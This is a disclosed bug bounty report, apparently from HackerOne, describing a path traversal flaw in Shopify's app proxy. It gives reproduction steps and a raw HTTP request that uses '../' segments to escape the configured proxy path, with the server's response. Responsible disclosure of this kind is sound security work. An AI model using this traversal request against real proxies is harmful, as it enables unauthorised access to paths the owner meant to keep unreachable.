# Path Traversal in App Proxy

## Report Details
- **Report ID**: 869888
- **URL**: https://hackerone.com/reports/869888
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-10T06:56:14.534Z
- **Disclosed**: 2020-08-24T22:27:51.998Z

## Reporter
- **Username**: ngalog
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi,

I found app proxy is vulnerable to path traversal, the attacker scenario is from anonymous user to oauth app owner.

## Description
In app proxy function, it is possible proxy request to shopify custom domain request to oauth app store defined host, and because shopify didn't escape the `../`, it allows anyone to escape the path and reach unintended location.

## Steps to reproduce
- Since setting up and explaining how to setup app proxy would be so trouble, I'll go straight to the point.
- The app proxy for my oauth app is set to  `https://████████/proxy`, path and subpath is `apps/ss`
- My store `█████` has installed it
- If you go https://███████/apps/ss/test, you should see `hi im ron`, which matches `https://██████████/proxy/test`
- In theory, you can't use this proxy to see what's hosting in `https://████████/` since I have added `/proxy` in the path
- However with this path traversal, it is possible now

Copy and paste this to the burp repeater and hit Send

```
GET /apps/ss/b.php/../../?shop=a&Shop=asd HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1


```

response is 

```
	<head>
<meta name=dropbox-domain-verification content=4yyz8tdqnx1e />
</head>


<body>hi</body>


```

Which matches response at `https://█████/`

## Impact

Able to perform path traversal on oauth app as anonymous user

## Attachments
No attachments
